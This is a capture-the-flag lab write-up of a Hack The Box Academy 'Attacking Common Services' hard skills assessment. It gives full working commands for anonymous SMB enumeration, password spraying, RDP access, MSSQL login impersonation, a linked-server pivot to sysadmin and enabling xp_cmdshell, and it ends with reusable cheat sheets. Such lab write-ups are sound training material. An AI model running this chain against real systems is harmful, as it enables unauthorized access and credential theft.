# HTB Academy — Attacking Common Services: Skills Assessment Hard

| Field | Details |
|---|---|
| Platform | Hack The Box Academy |
| Module | 11 — Attacking Common Services |
| Lab | Skills Assessment — Hard |
| Difficulty | Hard |
| OS | Windows Server 2019 |
| Target IP | 10.129.112.104 |
| Hostname | WIN-HARD |
| Date | April 2026 |

---

## Lab Objective

Four questions — answered in sequence:

| # | Question |
|---|---|
| Q1 | What file can you retrieve that belongs to the user simon? |
| Q2 | Find a password for the user Fiona. |
| Q3 | What other user can we compromise to gain admin privileges? |
| Q4 | Submit the contents of flag.txt on the Administrator Desktop. |

Zero credentials provided. Pure Windows lab — no FTP, no SSH, no Linux tooling after initial recon. The entire post-access phase runs inside Windows PowerShell and MSSQL.

---

## Attack Chain Summary

```
Nmap -Pn → SMB(445), MSSQL(1433), RDP(3389) — Windows Server 2019
smbclient null session → Home share → IT/Simon/random.txt + IT/Fiona/creds.txt + IT/John/* (Q1)
cat creds.txt secrets.txt random.txt > passwords.txt
crackmapexec smb → fiona:48Ns72!bns74@S84NNNSl (Q2)
xfreerdp as fiona → Windows desktop → open PowerShell
SQLCMD.EXE -S WIN-HARD → Windows Auth as fiona → MSSQL session
SELECT IMPERSONATE permissions → john, simon (Q3: john)
SELECT srvname FROM sysservers → LOCAL.TEST.LINKED.SRV (isremote=0)
EXECUTE AS LOGIN = 'john' → EXECUTE('...') AT [LOCAL.TEST.LINKED.SRV]
→ system_user = testadmin | is_srvrolemember('sysadmin') = 1
Enable xp_cmdshell on linked server via sp_configure
EXECUTE('xp_cmdshell ''more C:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
→ flag captured (Q4)
```

---

## Phase 1 — Nmap Scan

Windows hosts commonly block ICMP ping. Without `-Pn`, Nmap assumes the host is down and skips the scan. `-Pn` skips the host discovery check and scans regardless.

```bash
Hackerpatel007_1@htb[/htb]$ nmap -A -Pn 10.129.112.104
```

**Output:**

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.112.104
Host is up (0.088s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 RTM
| ms-sql-ntlm-info:
|   Target_Name: WIN-HARD
|   DNS_Computer_Name: WIN-HARD
|   Product_Version: 10.0.17763
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: WIN-HARD
|   Product_Version: 10.0.17763

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

**Analysis:**

| Port | Service | Action |
|---|---|---|
| 445 | SMB | Null session — enumerate shares |
| 1433 | MSSQL 2019 | Note for later — needs credentials |
| 3389 | RDP Win Server 2019 | GUI access once credentials are confirmed |
| 135 | RPC | Supports SMB enumeration |

SMB signing enabled but NOT required — relay attacks are possible but not needed here. The attack path: SMB null session → gather credentials → RDP login → pivot to MSSQL.

---

## Phase 2 — SMB Null Session Enumeration

A null session is an unauthenticated SMB connection — no username, no password. Windows SMB can be configured to allow anonymous share listing for legacy compatibility. This is a misconfiguration but extremely common in internal environments.

```bash
Hackerpatel007_1@htb[/htb]$ smbclient -N -L 10.129.112.104
```

| Flag | Purpose |
|---|---|
| `-N` | No password — null session (anonymous) |
| `-L` | List available shares |

**Output:**

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Home            Disk
        IPC$            IPC       Remote IPC
```

**Share analysis:**

| Share | Notes |
|---|---|
| ADMIN$ | Maps to C:\Windows — requires admin rights |
| C$ | Full C: drive — requires admin rights |
| IPC$ | Inter-process communication — null session landing point |
| Home | Non-default custom share — investigate immediately |

`Home` was created by an administrator. Custom shares almost always contain user data, documents, or credentials.

---

## Phase 3 — Download Files from SMB Home Share

Connect to the Home share and enumerate:

```bash
Hackerpatel007_1@htb[/htb]$ smbclient -N //10.129.112.104/Home
```

**SMB session:**

```
Try "help" to get a list of possible commands.
smb: \> ls
  HR                                D        0  Thu Apr 21 22:04:39 2022
  IT                                D        0  Thu Apr 21 22:11:44 2022
  OPS                               D        0  Thu Apr 21 22:05:10 2022
  Projects                          D        0  Thu Apr 21 22:04:48 2022
```

`IT` is the priority — IT staff routinely store credentials, private keys, scripts, and configuration files.

```
smb: \> cd IT\Fiona\
smb: \IT\Fiona\> get creds.txt
getting file \IT\Fiona\creds.txt of size 118 as creds.txt (2.9 KiloBytes/sec)

smb: \IT\Fiona\> cd ..\Simon\
smb: \IT\Simon\> get random.txt
getting file \IT\Simon\random.txt of size 94 as random.txt (2.4 KiloBytes/sec)

smb: \IT\Simon\> cd ..\John\
smb: \IT\John\> prompt
smb: \IT\John\> mget *
getting file \IT\John\information.txt of size 101 as information.txt (2.5 KiloBytes/sec)
getting file \IT\John\notes.txt of size 164 as notes.txt (4.0 KiloBytes/sec)
getting file \IT\John\secrets.txt of size 99 as secrets.txt (2.4 KiloBytes/sec)
smb: \IT\John\> exit
```

| Command | Purpose |
|---|---|
| `cd IT\Fiona\` | Navigate into subdirectory — use backslashes on SMB paths |
| `get creds.txt` | Download single file |
| `cd ..\Simon\` | Go up one level then into Simon's folder |
| `prompt` | Toggle off Y/N confirmation per file — required before mget |
| `mget *` | Download all files — wildcard |

**Answer to Question 1:** `random.txt` — the file retrieved from Simon's directory.

---

## Phase 4 — Build Password List and Brute Force Fiona

Combine all downloaded files into a single wordlist — any file could contain Fiona's password:

```bash
Hackerpatel007_1@htb[/htb]$ cat creds.txt secrets.txt random.txt > passwords.txt
Hackerpatel007_1@htb[/htb]$ cat passwords.txt
```

**Output:**

```
Windows Creds
kAkd03SA@#!
48Ns72!bns74@S84NNNSl
YaZG0CAbHbKjOGLaQhGa9Vr
2Z3SjOgEJGRShNhqNLZCMARS
...
```

Validate against SMB — SMB authentication is faster than RDP (lightweight handshake vs full GUI session negotiation). Always confirm credentials via SMB before opening an RDP session:

```bash
Hackerpatel007_1@htb[/htb]$ sudo crackmapexec smb 10.129.112.104 -u fiona -p passwords.txt
```

| Flag | Purpose |
|---|---|
| `smb` | Target the SMB service |
| `-u fiona` | Single known username |
| `-p passwords.txt` | Combined wordlist |

**Output:**

```
SMB  10.129.112.104  445  WIN-HARD  [*] Windows 10.0 Build 17763 x64 (name:WIN-HARD)
SMB  10.129.112.104  445  WIN-HARD  [-] WIN-HARD\fiona:Windows Creds STATUS_LOGON_FAILURE
SMB  10.129.112.104  445  WIN-HARD  [-] WIN-HARD\fiona:kAkd03SA@#! STATUS_LOGON_FAILURE
SMB  10.129.112.104  445  WIN-HARD  [+] WIN-HARD\fiona:48Ns72!bns74@S84NNNSl (Pwn3d!)
```

`[+]` = valid credential. `[-]` = failure.

**Credentials:** `fiona : 48Ns72!bns74@S84NNNSl`

**Answer to Question 2:** `48Ns72!bns74@S84NNNSl`

---

## Phase 5 — RDP Login as Fiona

```bash
Hackerpatel007_1@htb[/htb]$ xfreerdp /v:10.129.112.104 /u:fiona /p:'48Ns72!bns74@S84NNNSl' /cert:ignore
```

| Flag | Purpose |
|---|---|
| `/v:` | Target IP |
| `/u:` | Username |
| `/p:` | Password — wrapped in single quotes due to special characters |
| `/cert:ignore` | Skip self-signed certificate verification |

A full Windows desktop opens as Fiona. Open PowerShell from the Start menu or taskbar. All subsequent commands are typed inside the PowerShell window on this RDP session.

---

## Phase 6 — Connect to MSSQL via Windows Authentication

SQL Server supports two authentication modes — SQL Server Auth (separate SQL login) and Windows Auth (uses the current Windows identity). Running `SQLCMD.EXE -S WIN-HARD` while logged in as Fiona via RDP causes SQL Server to authenticate her Windows identity automatically — no SQL password required.

This is why RDP access matters first. **The Windows session IS the credential.**

```powershell
PS C:\Users\Fiona> SQLCMD.EXE -S WIN-HARD
```

| Part | Purpose |
|---|---|
| `SQLCMD.EXE` | Microsoft command-line SQL Server tool |
| `-S WIN-HARD` | Connect to SQL Server on local machine by hostname |

No `-U` or `-P` flags = Windows Authentication used automatically.

Prompt changes to:

```
1>
```

Inside an interactive MSSQL session. Every command is followed by `GO` on the next line. `GO` is the batch execution signal — SQLCMD buffers input and sends it to the server only when `GO` is entered.

---

## Phase 7 — Find Impersonatable Users

SQL Server allows one login to assume another's identity via `EXECUTE AS LOGIN`. If Fiona has `IMPERSONATE` permission on a higher-privilege user, she can run commands as that user — including sysadmin-level operations. This is a common misconfiguration in development environments.

```sql
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

**What each line does:**

| Line | Purpose |
|---|---|
| `SELECT distinct b.name` | Get unique names of SQL logins that can be impersonated |
| `FROM sys.server_permissions a` | Table of all SQL permission assignments |
| `INNER JOIN sys.server_principals b` | Table of all SQL logins |
| `ON a.grantor_principal_id = b.principal_id` | Link permissions to login names |
| `WHERE a.permission_name = 'IMPERSONATE'` | Filter to impersonation grants only |

**Output:**

```
name
------
john
simon

(2 rows affected)
```

Fiona can impersonate both `john` and `simon`. Testing will confirm john has sysadmin rights on the linked server.

**Answer to Question 3:** `john`

---

## Phase 8 — Enumerate Linked Servers

A SQL Server Linked Server is a configured connection to another SQL Server instance. Queries can be forwarded to it using `EXECUTE ... AT`. If the link was configured with high-privilege credentials, commands sent to the linked server run at that privilege level — regardless of the local user's rights.

```sql
1> SELECT srvname, isremote FROM sysservers
2> GO
```

**Output:**

```
srvname                       isremote
----------------------------- --------
WINSRV02\SQLEXPRESS           1
LOCAL.TEST.LINKED.SRV         0

(2 rows affected)
```

| Value | Meaning |
|---|---|
| `isremote = 1` | Remote server — accessible but not a formal linked server |
| `isremote = 0` | Linked server — configured SQL Server link, queryable with AT |

`LOCAL.TEST.LINKED.SRV` with `isremote = 0` is the pivot target.

---

## Phase 9 — Impersonate John and Verify Linked Server Sysadmin Access

The privilege chain has two hops:

```
Fiona → impersonates john (EXECUTE AS LOGIN)
john  → executes on linked server (EXECUTE ... AT)
Linked server → runs as testadmin (sysadmin) due to link configuration
```

```sql
1> EXECUTE AS LOGIN = 'john'
2> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
3> GO
```

**Command breakdown:**

| Part | Purpose |
|---|---|
| `EXECUTE AS LOGIN = 'john'` | Fiona becomes john — all commands now run as john's identity |
| `EXECUTE('...') AT [LOCAL.TEST.LINKED.SRV]` | Send the inner SQL string to the linked server for execution |
| `@@servername` | Confirm which server is executing |
| `system_user` | Identity under which the command runs on the linked server |
| `is_srvrolemember('sysadmin')` | 1 = sysadmin, 0 = not sysadmin |

**Why double single-quotes `''sysadmin''`:** The outer `EXECUTE('...')` wraps the string in single quotes. Any single quote inside must be escaped by doubling — `'sysadmin'` becomes `''sysadmin''`.

**Output:**

```
                                                                               system_user
WIN-HARD\SQLEXPRESS  Microsoft SQL Server 2019 (RTM)...  testadmin  1

(1 rows affected)
```

| Column | Value | Meaning |
|---|---|---|
| `@@servername` | WIN-HARD\SQLEXPRESS | Successfully connected to linked server |
| `system_user` | testadmin | Running as testadmin on the linked server |
| `is_srvrolemember('sysadmin')` | 1 | testadmin is sysadmin — full control |

Full sysadmin access on the linked server confirmed via a two-hop chain.

---

## Phase 10 — Enable xp_cmdshell on the Linked Server

`xp_cmdshell` is a SQL Server stored procedure that executes Windows OS commands and returns output as query rows. Disabled by default since SQL Server 2005. With sysadmin access on the linked server, it can be re-enabled via `sp_configure`.

```sql
1> EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
2> GO
```

**What each part does:**

| Command | Purpose |
|---|---|
| `sp_configure 'show advanced options', 1` | xp_cmdshell is hidden under advanced options — make it visible |
| `RECONFIGURE` | Apply setting change immediately — without this, change is staged but not active |
| `sp_configure 'xp_cmdshell', 1` | Enable xp_cmdshell (1 = on) |
| `RECONFIGURE` | Activate xp_cmdshell immediately |

All four commands are sent as a single string via `EXECUTE ... AT` to the linked server.

**Output:**

```
Configuration option 'show advanced options' changed from 0 to 1.
Run the RECONFIGURE statement to install.
Configuration option 'xp_cmdshell' changed from 0 to 1.
Run the RECONFIGURE statement to install.
```

`xp_cmdshell` is now active on the linked server.

---

## Phase 11 — Read the Flag via xp_cmdshell

```sql
1> EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
2> GO
```

**Quoting layers explained:**

| Layer | Content | Why |
|---|---|---|
| Outer | `EXECUTE('...')` | Wraps command in single quotes for linked server |
| Middle | `xp_cmdshell ''...''` | xp_cmdshell argument — single quotes doubled inside outer string |
| Inner | `more c:\users\administrator\desktop\flag.txt` | The Windows command — no quotes needed, path has no spaces |

**Output:**

```
output
------
HTB{...flag_redacted...}
NULL

(2 rows affected)
```

`NULL` on the last row is expected — it represents the empty line after the file content.

**Flag captured ✅**

---

## The Full MSSQL Privilege Chain

```
Fiona (RDP session, low-priv Windows user)
  │
  └─ PS C:\Users\Fiona> SQLCMD.EXE -S WIN-HARD
       │
       └─ Windows Auth → SQL Server accepts Fiona's Windows identity
            │
            └─ EXECUTE AS LOGIN = 'john'
                 │
                 └─ SQL session now running as john
                      │
                      └─ EXECUTE('...') AT [LOCAL.TEST.LINKED.SRV]
                           │
                           └─ Linked server authenticates as testadmin (sysadmin)
                                │
                                └─ xp_cmdshell → OS command execution as sysadmin
                                     │
                                     └─ more C:\users\administrator\desktop\flag.txt
                                          │
                                          └─ HTB{...flag_redacted...} ✅
```

---

## Why This is Hard Difficulty

| Challenge | Why It Is Harder Than Medium |
|---|---|
| Windows-only tooling post-RDP | PowerShell and SQLCMD — no Linux CLI after recon |
| MSSQL Windows Authentication | Active RDP session required to use Windows identity in SQL |
| User impersonation discovery | Requires knowing `sys.server_permissions` query |
| Linked server enumeration | Requires knowing `sysservers` table and `isremote` column |
| Two-hop privilege chain | Fiona → john (impersonation) → testadmin (linked server trust) |
| Nested SQL string quoting | Triple-escaped single quotes across two EXECUTE wrappers |

---

## Lessons Learned

The `-Pn` flag on Nmap was a lesson reinforced early — Windows hosts in lab environments almost universally block ICMP. Running Nmap without `-Pn` on a Windows target and getting no results is a common false negative. The host is up but appears dead because ping is blocked. `-Pn` is now part of every Windows scan by default.

The `prompt` command before `mget` in smbclient is a small efficiency that saves significant time when downloading directories with multiple files. Without it, smbclient asks for confirmation on every single file. `prompt` toggles that off — then `mget *` downloads the entire directory silently. This workflow applies to any multi-file SMB download.

The Windows Authentication mode in MSSQL was the conceptual pivot that made the lab work. The connection between "RDP session as Fiona" and "SQLCMD authenticates as Fiona automatically" is not obvious until you understand how Windows Integrated Authentication works. The Windows login token from the RDP session is passed transparently to SQL Server — no separate SQL credential needed. This is also why credential theft that gives Windows account access can cascade into database access on the same machine.

The nested quoting in `EXECUTE ... AT` is a specific syntax pattern worth memorising. Every additional `EXECUTE` wrapper requires doubling all single quotes inside it. The pattern `''value''` inside an outer `EXECUTE('...')` is correct at one level. Adding another wrapper layer means `''''value''''`. Counting quote levels before executing prevents syntax errors that look identical to permission errors.

---

## Full Attack Chain Reference

```
1.  nmap -A -Pn 10.129.112.104
    → SMB(445), MSSQL 2019(1433), RDP(3389) — Windows Server 2019 (Build 17763)

2.  smbclient -N -L 10.129.112.104
    → Home share found — non-default, highest priority

3.  smbclient -N //10.129.112.104/Home
    cd IT\Simon → get random.txt              (Answer Q1: random.txt)
    cd ..\Fiona → get creds.txt
    cd ..\John  → prompt → mget *             (information.txt, notes.txt, secrets.txt)

4.  cat creds.txt secrets.txt random.txt > passwords.txt

5.  sudo crackmapexec smb 10.129.112.104 -u fiona -p passwords.txt
    → [+] fiona:48Ns72!bns74@S84NNNSl        (Answer Q2: 48Ns72!bns74@S84NNNSl)

6.  xfreerdp /v:10.129.112.104 /u:fiona /p:'48Ns72!bns74@S84NNNSl' /cert:ignore
    → Windows desktop as Fiona → open PowerShell

7.  PS C:\Users\Fiona> SQLCMD.EXE -S WIN-HARD
    → 1> (MSSQL session, Windows Auth as Fiona)

8.  SELECT IMPERSONATE permissions → john, simon
                                                  (Answer Q3: john)

9.  SELECT srvname, isremote FROM sysservers
    → LOCAL.TEST.LINKED.SRV (isremote=0) = pivot target

10. EXECUTE AS LOGIN = 'john'
    EXECUTE('select system_user, is_srvrolemember(''sysadmin'')')
    AT [LOCAL.TEST.LINKED.SRV]
    → testadmin | 1 = sysadmin confirmed on linked server

11. EXECUTE('EXECUTE sp_configure ''show advanced options'',1;RECONFIGURE;
    EXECUTE sp_configure ''xp_cmdshell'',1;RECONFIGURE')
    AT [LOCAL.TEST.LINKED.SRV]
    → xp_cmdshell enabled

12. EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''')
    AT [LOCAL.TEST.LINKED.SRV]
    → HTB{...flag_redacted...} ✅           (Answer Q4)
```

---

## SQLCMD Quick Reference

```sql
-- Connect (Windows Auth — no password flags)
PS C:\> SQLCMD.EXE -S WIN-HARD

-- Connect (SQL Auth)
PS C:\> SQLCMD.EXE -S WIN-HARD -U sa -P password

-- Every command batch needs GO to execute
1> SELECT @@servername
2> GO

-- Check current user and sysadmin status
1> SELECT system_user, is_srvrolemember('sysadmin')
2> GO

-- Find impersonatable users
1> SELECT distinct b.name FROM sys.server_permissions a
2> INNER JOIN sys.server_principals b
3> ON a.grantor_principal_id = b.principal_id
4> WHERE a.permission_name = 'IMPERSONATE'
5> GO

-- Impersonate a user
1> EXECUTE AS LOGIN = 'john'
2> GO

-- Find linked servers
1> SELECT srvname, isremote FROM sysservers
2> GO

-- Execute command on linked server
1> EXECUTE('SELECT system_user') AT [LINKED.SERVER.NAME]
2> GO

-- Enable xp_cmdshell on linked server
1> EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;
   RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE')
   AT [LINKED.SERVER.NAME]
2> GO

-- Run OS command on linked server
1> EXECUTE('xp_cmdshell ''whoami''') AT [LINKED.SERVER.NAME]
2> GO

-- Read file on linked server
1> EXECUTE('xp_cmdshell ''type C:\path\to\flag.txt''') AT [LINKED.SERVER.NAME]
2> GO
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -A -Pn <IP>` | Aggressive scan with ping disabled — required for Windows |
| `smbclient -N -L <IP>` | List SMB shares anonymously |
| `smbclient -N //<IP>/Home` | Connect to share without credentials |
| `smb: \> prompt` | Toggle off per-file confirmation before mget |
| `smb: \> mget *` | Download all files in current directory |
| `cat file1 file2 file3 > passwords.txt` | Combine multiple files into one wordlist |
| `sudo crackmapexec smb <IP> -u fiona -p passwords.txt` | SMB credential spray |
| `xfreerdp /v:<IP> /u:fiona /p:'<pass>' /cert:ignore` | RDP login from Linux |
| `SQLCMD.EXE -S WIN-HARD` | Connect to SQL Server via Windows Authentication (inside RDP) |
| `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'` | Find impersonatable SQL logins |
| `SELECT srvname, isremote FROM sysservers` | List linked servers |
| `EXECUTE AS LOGIN = 'john'` | Impersonate a SQL login |
| `EXECUTE('SELECT system_user, is_srvrolemember(''sysadmin'')') AT [LINKED.SERVER]` | Test sysadmin on linked server |
| `EXECUTE('EXECUTE sp_configure ''show advanced options'',1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'',1;RECONFIGURE') AT [LINKED.SERVER]` | Enable xp_cmdshell on linked server |
| `EXECUTE('xp_cmdshell ''more C:\users\administrator\desktop\flag.txt''') AT [LINKED.SERVER]` | Read flag via xp_cmdshell on linked server |
